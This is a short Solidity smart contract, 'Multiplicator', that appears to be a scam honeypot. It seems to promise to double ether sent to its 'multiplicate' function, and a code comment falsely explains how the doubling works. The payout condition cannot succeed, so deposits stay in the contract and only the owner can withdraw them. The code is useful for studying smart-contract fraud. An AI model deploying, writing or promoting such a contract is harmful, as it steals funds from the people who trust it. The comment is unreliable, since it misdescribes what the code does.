contract Multiplicator
{
    address public Owner = msg.sender;

    function withdraw() payable public
    {
        require(msg.sender == Owner);
        payable(Owner).transfer(address(this).balance);
    }

    // At the entrance to transfer the reciever balance is already increased by msg.value,
    // so the +msg.value makes it increase by 2 * msg.value at the exit of transfer.
    function multiplicate(address to) public payable
    {
        if(msg.value >= address(this).balance)
        {        
            payable(to).transfer(address(this).balance+msg.value);
        }
    }
}